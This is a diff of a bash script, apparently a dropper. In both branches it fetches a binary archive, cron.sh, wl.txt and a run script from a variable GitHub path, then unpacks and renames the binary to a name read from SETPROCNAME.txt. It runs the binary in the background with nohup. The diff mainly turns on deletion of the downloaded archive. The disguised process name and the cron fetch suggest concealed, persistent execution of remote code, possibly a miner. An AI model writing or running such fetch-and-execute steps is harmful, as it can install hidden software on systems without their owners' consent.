@@ -31,8 +31,7 @@ if [ $num = 2 ];
 		whoami > inuser.txt
 			wget https://github.com/$gitpath/raw/main/linux.tar.gz
 			tar -xvf linux.tar.gz
-			#rm -rf linux.tar.gz
-			#chua co thu muc bin
+			rm -rf linux.tar.gz
 			mkdir bin
 			cp linux bin/linux
 			wget https://raw.githubusercontent.com/$gitpath/main/cron.sh
@@ -51,25 +50,22 @@ if [ $num = 2 ];
            	wget https://raw.githubusercontent.com/$gitpath/main/wl.txt
 			Uuname=$(cat inuser.txt)
 			USEPROCNAME=$(cat SETPROCNAME.txt)
-			echo > trx.txt
 			wget https://raw.githubusercontent.com/$gitpath/main/runlinux.sh
 			mv runlinux.sh runsrc.sh
 			chmod +x runsrc.sh
-			date +'%A' > date.txt
 			mv linux $USEPROCNAME
 			#sudo chown -R $Uuname:$Uuname /home/$Uuname/
 			nohup sh runsrc.sh > result.log 2>&1 &
 			#2
-#---------------------
 			
 	else 
 		echo "RUN PROCESS 2"; 
-			#---------------------
+
 #1 Linux Trx
-whoami > inuser.txt
+		whoami > inuser.txt
 			wget https://github.com/$gitpath/raw/main/linux.tar.gz
 			tar -xvf linux.tar.gz
-			#rm -rf linux.tar.gz
+			rm -rf linux.tar.gz
 			#chua co thu muc bin
 			mkdir bin
 			cp linux bin/linux
@@ -89,15 +85,12 @@ whoami > inuser.txt
            	wget https://raw.githubusercontent.com/$gitpath/main/wl.txt
 			Uuname=$(cat inuser.txt)
 			USEPROCNAME=$(cat SETPROCNAME.txt)
-			echo > trx.txt
 			wget https://raw.githubusercontent.com/$gitpath/main/runlinux.sh
 			mv runlinux.sh runsrc.sh
 			chmod +x runsrc.sh
-			date +'%A' > date.txt
 			mv linux $USEPROCNAME
 			#sudo chown -R $Uuname:$Uuname /home/$Uuname/
 			nohup sh runsrc.sh > result.log 2>&1 &
 			#2
-#---------------------
 
 fi
